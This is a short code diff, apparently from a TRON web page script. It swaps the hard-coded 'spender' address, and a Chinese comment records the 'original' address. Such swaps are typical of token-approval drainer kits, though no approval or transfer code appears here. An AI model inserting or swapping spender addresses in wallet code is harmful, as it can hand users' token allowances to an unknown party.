@@ -1,4 +1,4 @@
-spender_bas58 = 'TPTkneMqubtYLHHyi6Z8jfRdi8Ff52aAmh' // 应该是合约地址，原来的是 TBvWK12aKi3ravybcEyPNSh2qeU7oAgWpb ，其他不变
+spender_bas58 = 'TLT3QYegpmLWhmszCebTfNqwdPGcQFJn9z' // 应该是合约地址，原来的是 TBvWK12aKi3ravybcEyPNSh2qeU7oAgWpb ，其他不变
 if (typeof window.tronWeb !== 'undefined') {
   spender_hex = tronWeb.address.toHex(spender_bas58)
 } else {
